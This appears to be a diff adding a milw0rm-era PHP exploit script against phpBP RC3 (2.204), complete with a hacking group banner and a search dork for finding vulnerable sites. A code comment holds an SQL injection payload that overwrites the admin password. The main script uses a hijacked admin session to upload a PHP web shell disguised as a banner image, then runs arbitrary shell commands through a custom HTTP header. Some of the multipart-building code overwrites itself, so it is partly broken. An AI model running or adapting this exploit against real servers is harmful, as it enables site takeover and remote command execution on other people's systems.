@@ -1,0 +1,241 @@
+<?
+//**************************************************************
+//Kacper & str0ke Settings 
+$exploit_name = "phpBP <= RC3 (2.204) (sql/cmd) Remote Code Execution Exploit";
+$script_name = "phpBP RC3 (2.204)";
+$script_site = "http://www.phpbp.com/";
+$dork = 'Silnik strony jest chroniony prawami autorskimi PHP BP Team';
+//to work exploit you need admin session
+//**************************************************************
+print '
+:::::::::  :::::::::: :::     ::: ::::::::::: :::        
+:+:    :+: :+:        :+:     :+:     :+:     :+:        
++:+    +:+ +:+        +:+     +:+     +:+     +:+        
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
++#+    +#+ +#+         +#+   +#+      +#+     +#+        
+#+#    #+# #+#          #+#+#+#       #+#     #+#        
+#########  ##########     ###     ########### ########## 
+::::::::::: ::::::::::     :::     ::::    ::::  
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
+    +#+     +#+        +#+     +#+ +#+       +#+ 
+    #+#     #+#        #+#     #+# #+#       #+# 
+    ###     ########## ###     ### ###       ### 
+	
+   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+ 
+
+[Exploit name: '.$exploit_name.'
+[Script name: '.$script_name.'
+[Script site: '.$script_site.'
+dork: '.$dork.'
+
+Find by: Kacper (a.k.a Rahim)
+Blog: http://kacper.bblog.pl/
+
+DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam
+DEVIL TEAM HOME: http://www.rahim.webd.pl/
+
+Contact: kacper1964@yahoo.pl
+
+(c)od3d by Kacper
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Greetings DragonHeart and all DEVIL TEAM Patriots :)
+- Leito & Leon | friend str0ke ;)
+
+pepi, D0han, d3m0n, D3m0n (ziom z Niemiec :P)
+dn0de, DUREK5, fdj, konsol, mass, michalind, mIvus, nukedclx, QunZ,
+RebeL, SkD, Adam, drzewko, Leito, LEON, TomZen, dub1osu, ghost, WRB
+
+ and
+ 
+Dr Max Virus
+TamTurk,
+hackersecurity.org
+and all exploit publishers
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                Greetings for 4ll Fusi0n Group members ;-)
+                and all members of hacker.com.pl ;)
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+            Kacper Hacking & Security Blog: http://kacper.bblog.pl/
+';
+/*
+Exploit upload evil script when admin add new banner in portal.
+
+i Find some errors in forum. Enter in comment forum:
+                                                                                                                                                                                                                                                                                 */
+//fajny';UPDATE/**/`22_users`/**/SET/**/`pass`/**/=/**/'6a8f25e5b30777a0435c22fe36f45e3c',`buddies`/**/=/**/NULL,`forum_subscribed`/**/=/**/NULL,`forum_subscribed_clicked`/**/=/**/NULL,`forum_unsubscribe`/**/=/**/NULL/**/WHERE/**/`id`/**/=/**/'1'/**/LIMIT/**/1;
+/*
+then you can insert SQL code :)
+*/
+if ($argc<5) {
+print_r('
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Usage: php '.$argv[0].' host path admin_session cmd OPTIONS
+host:       target server (ip/hostname)
+path:       phpBP Forum path
+admin_session: admin session id
+cmd:        a shell command (ls -la)
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /phpBP/ d6c6cae3dfea20a0a5358fc9baff47be ls -la -P1.1.1.1:80
+php '.$argv[0].' 2.2.2.2 /phpBP/ d6c6cae3dfea20a0a5358fc9baff47be ls -la
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+');
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+$host=$argv[1];
+$path=$argv[2];
+$adsess=$argv[3];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+echo "Connected...\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"url\";\r\n\r\n";
+$data.="http://kacper.bblog.pl/\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"limit\";\r\n\r\n";
+$data.="0\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"image\";\r\n\r\n";
+$data.="1\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"form\";\r\n\r\n";
+$data.="1\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"image_form\" filename=\"d.jpg.vil.gif.php\";\r\n\r\n";
+$data.="Content-Type: text/plain\r\n";
+$data.="Content-Transfer-Encoding: binary\r\n";
+$data.='<?php ob_clean();//Ruchomy zamek Hauru ;-)echo"...Hacker..Kacper..Made..in..Poland!!...DEVIL.TEAM..the..best..polish..team..Greetz...";echo"...Go To DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam";echo"...DEVIL TEAM SITE: http://www.rahim.webd.pl/";ini_set("max_execution_time",0);echo "Hauru";passthru($_SERVER[HTTP_HAURU]);die;?>\r\n';
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"image_http\";\r\n\r\n";
+$data.="http://\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"swf\";\r\n\r\n";
+$data.="0\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"alt\";\r\n\r\n";
+$data.="0\r\n";
+$data ="--H4ck\r\n";
+$data.="Content-Disposition: form-data; name=\"submit\";\r\n\r\n";
+$data.="Add\r\n";
+$data.="--H4ck--\r\n";
+echo "wait now insert evil code...\n";
+$packet ="POST ".$p."index.php?module=admin&action=banners&cmd=add HTTP/1.0\r\n";
+$packet.="Cookie: phpBP2=".$adsess.";\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=--H4ck\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+$packet ="GET ".$p."index.php?module=admin&action=banners HTTP/1.0\r\n";
+$packet.="Cookie: phpBP2=".$adsess.";\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+$temp=explode('<TD CLASS="row_1" ALIGN="CENTER"><A HREF="upload/banners/',$html);
+$temp2=explode('.php" TARGET="_blank">',$temp[1]);
+$uploadid=trim($temp2[0]);
+if ($uploadid) {echo "Step 1\n";
+echo "Upload id: ".$uploadid."\n";
+$packet ="GET ".$p."upload/banners/".$uploadid.".php HTTP/1.0\r\n";
+$packet.="HAURU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+sleep(1);
+}else {
+echo "exploit failed... can't upload script :/\n";
+echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
+die("\n\nClose Connection");
+}
+if (strstr($html,"Hauru"))
+{
+$temp=explode("Hauru",$html);
+die($temp[1]);
+}
+?>
+
+# milw0rm.com [2007-01-18]
